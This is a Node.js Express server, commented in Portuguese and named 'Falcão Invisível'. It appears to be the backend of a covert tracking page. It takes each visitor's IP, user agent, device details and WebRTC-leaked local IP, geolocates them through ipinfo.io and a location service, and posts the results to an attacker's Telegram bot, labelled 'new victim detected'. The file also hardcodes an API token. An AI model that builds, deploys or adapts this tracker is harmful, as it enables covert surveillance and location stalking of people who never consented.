const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Variáveis de ambiente (Render ou .env local)
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/log', async (req, res) => {
  const data = req.body;
  console.log("📥 Dados recebidos do front:", data);

  // Confere se o bot está configurado
  if (!botToken || !chatId) {
    console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
    return res.status(500).send("Bot não configurado.");
  }

  let preciseLoc = null;

  try {
    const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ considerIp: true })
    });
    const mlsData = await mlsRes.json();
    if (mlsData && mlsData.location) {
      preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
    }
  } catch (mlsErr) {
    console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
  }

  try {
    const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
    const ipInfo = await ipResponse.json();

    const mensagem = `
📡 *NOVA VÍTIMA DETECTADA*

🧠 *ID:* \`${data.visitorId}\`
🌍 *IP:* \`${data.ip}\`
📍 *Localização:* ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🏢 *ISP:* ${ipInfo.org}
🕵️‍♂️ *User-Agent:* \`${data.userAgent}\`
📱 *Dispositivo:* \`${data.device}\`
📌 *Lat/Long:* ${preciseLoc || ipInfo.loc || "Indisponível"}
🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
`;

    console.log("🔍 Enviando dados ao Telegram...");

    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensagem,
        parse_mode: "Markdown"
      })
    });

    const telegramResult = await telegramRes.json();
    console.log("📤 RESPOSTA TELEGRAM:", telegramResult);

    if (!telegramResult.ok) {
      console.error("❌ Erro ao enviar para o Telegram:", telegramResult.description);
    } else {
      console.log("✅ Notificação enviada com sucesso!");
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Erro no processo de rastreamento:", err);
    res.status(500).send("Erro interno no rastreamento.");
  }
});

app.listen(PORT, () => {
  console.log(`🦅 Falcão Invisível rodando em: http://localhost:${PORT}`);
});
